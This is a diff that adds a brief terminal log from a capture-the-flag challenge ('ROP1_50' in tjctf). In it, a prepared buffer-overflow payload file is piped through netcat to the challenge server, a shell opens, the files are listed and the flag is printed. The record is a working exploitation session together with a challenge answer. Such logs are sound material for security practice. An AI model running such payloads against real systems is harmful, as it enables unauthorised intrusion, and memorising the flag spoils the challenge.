@@ -1,0 +1,11 @@
+[09:37 pm] chesley:~/Dropbox/CTFs/tjctf/ROP1_50 $
+>> cat overflow - | nc p.tjctf.org 8094
+Enter your name ls
+Dockerfile
+etc
+flag
+prog
+rop1
+wrapper
+cat flag
+isnt_ret_a_nice_instruction
